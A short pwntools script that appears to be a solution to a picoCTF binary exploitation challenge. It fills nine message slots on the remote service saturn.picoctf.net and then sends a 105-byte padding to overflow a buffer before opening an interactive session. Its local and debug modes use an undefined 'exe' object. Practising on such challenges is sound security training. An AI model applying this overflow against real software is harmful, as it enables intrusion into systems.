#!/usr/bin/env python3

from pwn import *



context.arch = "i386"


def conn():
    if args.LOCAL:
        print("*******LOCAL********")
        r = process([exe.path])
    elif args.GDB:
        print("*******GDB********")
        r = process([exe.path])
        gdb.attach(exe.path, 'c')
    elif args.BREAK:
        print("*******BREAK********")
        r = process([exe.path])
        gdb.attach(exe.path, '''

        c''')
    else:
        print("*******REMOTE********")
        r = remote("saturn.picoctf.net", 52681)

    return r

def write_msg(r, msg, len):
    r.sendline(b'1')
    ignore = r.recvn(0x1c)
    r.sendline(msg)
    ignore = r.recvn(0x2d)
    r.sendline(len)
    ignore = r.recvn(0x3 + 0x50)

def read_msg(r, idx):
    r.sendline(b'2')
    ignore = r.recvn(0x30)



def main():
    r = conn()
    ignore = r.recvn(0x98)
    # populate first 9 input fields
    for i in range(0,9):
        write_msg(r, b"derp", b"5")

    pad = b"A" * 105
    len = b"105"
    write_msg(r, pad, len)
    ignore = r.recvn(0x84)
    r.interactive()


if __name__ == "__main__":
    main()
